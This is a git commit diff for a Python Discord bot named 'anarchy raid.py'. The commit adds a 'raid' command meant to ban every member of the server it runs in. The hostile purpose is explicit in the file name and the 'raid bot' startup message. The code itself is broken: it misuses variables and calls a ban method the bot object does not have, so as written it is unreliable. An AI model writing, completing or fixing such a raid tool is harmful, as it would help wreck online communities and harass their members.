083feba27d26397599053201c6bd69d607160596
estemobs#9212 <57631804+Estemobs@users.noreply.github.com>
2020-10-15 10:24:04 +0200

    welloy
    good

--- anarchy raid.py
+++ anarchy raid.py
@@ -6,24 +6,18 @@ from discord.ext import commands
 bot = commands.Bot(command_prefix='r')
 
 
-
 @bot.listen()
 async def on_ready():
     print('raid bot prêt')
 
 
+@bot.command(pass_context = True)
+async def raid(ctx,*,guild):
+  for member in ctx.guild.members:
+    member = [member.id for member in guild.members]   
+    await bot.ban(member)
+    
 
-def get_all_members_ids(guild):
-    for member in guild.members:
-        yield member.id
-
-
-
-
-
-@bot.command()
-async def raid(ctx,):
-    await bot.ban(get_all_members_ids)
     
     
 
